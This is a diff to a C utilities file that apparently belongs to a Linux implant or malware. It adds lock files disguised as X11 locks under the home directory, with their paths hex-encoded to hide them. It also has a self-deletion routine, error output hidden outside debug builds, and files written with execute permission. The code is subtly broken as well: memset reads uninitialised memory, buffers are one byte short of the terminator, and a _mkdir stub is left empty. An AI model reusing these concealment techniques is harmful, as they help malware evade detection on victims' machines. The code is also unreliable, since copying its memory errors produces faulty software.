@@ -1,5 +1,6 @@
 #include "utils.h"
 
+#include <linux/limits.h>
 #include <stdbool.h>
 #include <stdlib.h>
 #include <strings.h>
@@ -12,6 +13,7 @@
 #include <sys/file.h>
 #include <unistd.h>
 #include <errno.h>
+#include <limits.h>
 
 /**
  * Create a lock file to ensure one instance is running.
@@ -21,15 +23,27 @@
  * */
 void create_lock() {
 
-    // /.X11/X0-lock
-    char x11_lock_file [14] = {0x2f,0x2e,0x58,0x31,0x31,0x2f,0x58,0x30,0x2d,0x6c,0x6f,0x63,0x6b,0xa};
     char *HOME = getenv("HOME");
+
+    //$HOME/.X11/X0-lock
+    char x11_lock_file [14] = {0x2f,0x2e,0x58,0x31,0x31,0x2f,0x58,0x30,0x2d,0x6c,0x6f,0x63,0x6b};
+
+    //$HOME/.X11/.X11-lock
+    char x11_lock_file_2 [16] = {0x2f,0x2e,0x58,0x31,0x31,0x2f,0x2e,0x78,0x31,0x31,0x2d,0x6c,0x6f,0x63,0x6b};
 
     // $HOME/.X11/x0-lock
     int fpath_size = strlen(HOME) + strlen(x11_lock_file);
     char *flock_path = (char *)malloc(fpath_size);
+    memset(flock_path, 0, strlen(flock_path));
     strncat(flock_path, HOME, strlen(HOME));
     strncat(flock_path, x11_lock_file, strlen(x11_lock_file));
+
+    // $HOME/.X11/x11-lock
+    int fpath_size_2 = strlen(HOME) + strlen(x11_lock_file_2);
+    char *flock_path_2 = (char *)malloc(fpath_size_2);
+    memset(flock_path_2, 0, strlen(flock_path_2));
+    strncat(flock_path_2, HOME, strlen(HOME));
+    strncat(flock_path_2, x11_lock_file_2, strlen(x11_lock_file_2));
 
     // create .X11 dir
     char *x11dir= "/.X11";
@@ -43,15 +57,24 @@ void create_lock() {
     }
 
     // create directory of .X11 if it does not exist
+    // TODO - what perms?
     int fd = open(flock_path, O_CREAT);
     if (fd > 0) {
         flock(fd, LOCK_EX);
     }
 
+    // create directory of .X11 if it does not exist
+    // TODO - what perms?
+    int fd_2 = open(flock_path_2, O_CREAT);
+    if (fd_2 > 0) {
+        flock(fd_2, LOCK_EX);
+    }
+
     free(flock_path);
+    free(flock_path_2);
     free(dirpath);
-    // lock file must already exist...
     close(fd);
+    close(fd_2);
 }
 
 
@@ -64,7 +87,9 @@ bool self_delete(char *fpath) {
 
     int res = unlink(fpath);
     if (res < 0){
-        fprintf(stderr, "[self_delete] Error: %s\n", strerror(errno));
+        #ifdef DEBUG
+        fprintf(stderr, "[utils/self_delete] Error: %s\n", strerror(errno));
+        #endif
         return false;
     }
     return true;
@@ -100,7 +125,6 @@ char *copy_pid_from_shared_mem(uint size, char *fpath) {
     }
 
     free(tmpFileBuff);
-
     return filePathBuff;
 }
 
@@ -118,7 +142,6 @@ bool write_to_file(char *fpath, char *data) {
 
     // TODO - double check file permissions
     int fd = open(fpath, O_CREAT | O_WRONLY, S_IRUSR|S_IEXEC);
-
     int numbyteswritten = write(fd, data, strlen(data));
 
     close(fd);
@@ -129,4 +152,12 @@ bool write_to_file(char *fpath, char *data) {
     }
 
     return false;
+}
+
+
+void _mkdir(bool home, char *fpath, int mode) {
+
+    char tmpPath[PATH_MAX];
+    char *path = NULL;
+    int len;
 }
